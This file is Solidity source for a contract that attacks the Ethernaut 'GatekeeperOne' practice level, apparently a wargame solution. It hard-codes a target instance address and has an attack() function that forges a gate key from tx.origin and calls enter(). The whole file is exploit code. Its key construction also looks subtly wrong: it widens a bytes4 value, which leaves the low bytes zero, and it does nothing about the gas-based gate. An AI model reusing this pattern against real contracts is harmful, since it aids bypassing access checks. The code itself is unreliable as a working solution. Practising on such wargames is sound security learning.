// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Instance: 0xA443B68F55CF08BD9132E33062E6b3375F1c6DDE
interface GatekeeperOne{
    function enter(bytes8 gateKey) external returns (bool);
}

contract EthernautGatekeeperOne {
    address public _target;
    constructor(address target) {
        _target = target;
    }

    function attack() public {
        bytes8 gateKey;
        gateKey = bytes4(abi.encode(bytes4("asdf"), bytes2(0), bytes2(uint16(uint160(tx.origin)))));
        GatekeeperOne(_target).enter(gateKey);
    }
}